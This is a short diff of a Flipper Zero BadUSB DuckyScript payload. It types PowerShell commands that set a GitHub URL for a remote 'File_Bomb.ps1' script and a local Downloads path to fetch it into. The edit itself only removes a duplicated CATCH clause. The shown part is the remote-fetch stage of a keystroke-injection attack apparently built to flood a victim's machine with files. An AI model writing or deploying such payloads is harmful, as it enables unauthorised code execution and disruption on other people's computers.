@@ -57,7 +57,7 @@ DELAY 500
 REM ##################################################################################################################################################################
 REM #================================Get PS1 Script from Github=======================================================================================================
 REM ##################################################################################################################################################################
-STRING TRY { $fileUrl = "https://raw.githubusercontent.com/RSanchezC169/FlipperZero/refs/heads/main/BadUsb/Windows/Bombs/File_Bomb.ps1"} CATCH {Write-Warning "Could not set file url"} CATCH { Write-Warning "Could not set file url"}
+STRING TRY { $fileUrl = "https://raw.githubusercontent.com/RSanchezC169/FlipperZero/refs/heads/main/BadUsb/Windows/Bombs/File_Bomb.ps1"} CATCH {Write-Warning "Could not set file url"}
 ENTER
 DELAY 500
 STRING TRY { $TempPath = (New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path }CATCH{Write-warning "Could not set temp path"}
